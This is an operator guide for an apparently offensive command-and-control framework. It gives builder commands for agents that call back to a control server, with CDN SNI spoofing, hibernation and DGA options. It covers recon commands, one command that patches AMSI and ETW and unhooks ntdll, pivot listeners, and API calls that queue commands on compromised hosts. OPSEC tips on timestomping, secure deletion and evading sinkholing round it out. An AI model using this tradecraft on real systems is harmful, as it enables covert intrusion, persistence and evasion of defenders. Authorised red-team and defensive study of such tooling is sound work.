# Operator Guide

## Login

Open the panel, enter the server URL and your credentials. The admin creates operator accounts via the **Audit Log** page or API.

Roles:
- **admin** — full access, can manage operators and listeners
- **operator** — can execute commands, manage sessions
- **viewer** — read-only, can see sessions and history but not run commands

## Workflow

### 1. Set Up Infrastructure
Navigate to **Listeners** page. Create listeners for your engagement:
- HTTPS on 443 for proxy-friendly egress
- TLS on 4443 for direct connections
- HTTP on 80 as a fallback

### 2. Configure Auto-Recon
On the **Listeners** page, scroll to **Auto-Recon**. Add commands that run on every new check-in:
```
whoami /all
hostname
ipconfig /all
net localgroup administrators
systeminfo
```

### 3. Build Agents
Use the builder to compile agents for each target platform and transport.

For standard persistent agents:
```bash
cargo run --bin builder -- \
  --host 10.0.0.1 --port 4443 --transport tls --platform windows
```

For CDN-fronted agents:
```bash
cargo run --bin builder -- \
  --host 203.0.113.5 --port 443 --transport https --platform windows \
  --sni legitimate-cdn.example.com --alpn h2,http/1.1
```

For hibernation agents (minimal footprint, no persistent socket):
```bash
cargo run --bin builder -- \
  --host 10.0.0.1 --port 4443 --transport tls --platform linux \
  --hibernation --batch-size 5 --sleep 300
```

### 4. Deploy
Execute the agent on the target. When it checks in, a green toast notification appears and the session shows in the host table.

### 5. Operate
Click **Shell** on a session to open a terminal. Or use the action buttons:
- **Shell** — interactive command terminal
- **Proxy** — start SOCKS5 tunnel through the session
- **Beacon** — toggle fast mode (100ms polling)
- **Processes** — view process list with inject buttons
- **Screenshot** — capture all monitors
- **Notes** — tag and annotate the session

### 6. Evasion (do this first on Windows)
In the terminal:
```
evasion:patch_all
```
This patches AMSI + ETW + unhooks ntdll in one command. Run before loading .NET assemblies or PowerShell.

### 7. Pivoting
From a compromised host, start a pivot listener:
```
pivot:listener_tcp 8888
```
Then deploy an agent on the next hop configured to connect to the pivot host on port 8888.

### 8. Planning Pivot Routes
Before pivoting manually, use the topology planner to identify which session has the best path to a target:
```bash
curl -s -H "X-API-KEY: $KEY" \
  "http://server:8080/api/topology/plan?target=10.10.5.0/24" | jq .rendered
```
The planner uses the network interfaces reported by agents at registration — no probes are sent. It ranks candidates by interface type, prefix specificity, and operational flags.

### 9. Operating Hibernation Agents
Hibernation agents check in, claim tasks, execute, and disconnect. Operate them through the task queue rather than live commands:

```bash
# Queue a command
curl -sX POST -H "X-API-KEY: $KEY" \
  -d '{"command":"whoami"}' \
  http://server:8080/api/hosts/3/queue

# List pending/completed tasks
curl -s -H "X-API-KEY: $KEY" \
  http://server:8080/api/hosts/3/tasks | jq .

# Get task output once complete
curl -s -H "X-API-KEY: $KEY" \
  http://server:8080/api/hosts/3/tasks/$TASK_ID | jq .output
```

The panel's **Queue** tab shows pending and completed tasks with live status.

## OPSEC Tips
- Use `bg <command>` for long-running commands so they don't block
- Use `secure_delete` to clean up dropped files
- Use `timestomp` to match file timestamps to nearby system files
- Set a kill date on agents (`--days 30`) so they don't persist forever
- Use `--sni` to send a CDN hostname in TLS ClientHello, even when the actual connection is to your server
- Use `--alpn h2,http/1.1` to match what browsers send; `h2` only if you speak HTTP/2
- Use DGA (`--dga-seed`) for campaigns that need to survive domain sinkholing — register the week's domains before deployment
- Hibernation agents (`--hibernation`) avoid long-connection detection; pair with a longer sleep interval to minimize check-in frequency
- Check `evasion:syscall_check` to verify syscall numbers resolved correctly before injection
- Use the topology planner before choosing pivot paths — it scores by interface type and avoids virtual/Docker interfaces automatically
